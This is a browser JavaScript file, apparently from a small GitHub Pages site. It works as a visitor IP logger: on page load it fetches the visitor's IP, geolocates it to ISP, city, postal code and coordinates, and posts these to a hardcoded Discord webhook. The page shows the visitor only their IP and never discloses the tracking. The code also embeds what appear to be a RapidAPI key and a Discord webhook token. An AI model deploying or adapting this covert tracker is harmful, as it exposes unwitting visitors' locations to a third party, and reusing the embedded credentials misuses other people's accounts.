document.addEventListener('DOMContentLoaded', () => {
  const xhr = new XMLHttpRequest();
  xhr.withCredentials = true;

  xhr.addEventListener('readystatechange', function () {
    if (this.readyState === this.DONE) {
      const data = JSON.parse(this.responseText);
      const ipAddress = data.ip;
      const currentDateTime = new Date();
      const dateTimeString = currentDateTime.toLocaleString();

      fetch(`https://json.geoiplookup.io/${ipAddress}`)
        .then(response => response.json())
        .then(geoData => {
          const message = createMessage(ipAddress, dateTimeString, geoData);
          sendToDiscord(message);
        })
        .catch(error => console.error(error));

      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
    }
  });

  xhr.open('GET', 'https://telize-v1.p.rapidapi.com/geoip');
  xhr.setRequestHeader('X-RapidAPI-Key', 'c473c77058mshaf8601016a529b7p1edb2ajsn7f89360478b3');
  xhr.setRequestHeader('X-RapidAPI-Host', 'telize-v1.p.rapidapi.com');

  xhr.send();
});


function createMessage(ipAddress, dateTimeString, geoData) {
  const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;

  const message = {
    embeds: [
      {
        title: '***NEW VISITOR***',
        color: 16776960, // Yellow color
        description: `
          IP Address: ${ip}
          Date and Time: ${dateTimeString}
          ISP: ${isp}
          Country: ${country_name}
          Region: ${region}
          City: ${city}
          Postal Code: ${postal}
          Latitude: ${latitude}
          Longitude: ${longitude}
        `,
        thumbnail: {
          url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
        },
        url: 'https://applebeesworker.github.io' // Customize the URL of the website
      }
    ]
  };

  return message;
}

function sendToDiscord(message) {
  const webhookUrl = 'https://discord.com/api/webhooks/1112485667105157250/Fdn-HkD6bu7AFkJq4AMAEy9hiP3Nn9OWgeaKLoITdeNOAyA9ymXiHx0bK6IrAcd4NSGx';

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Error sending message to Discord');
      }
    })
}
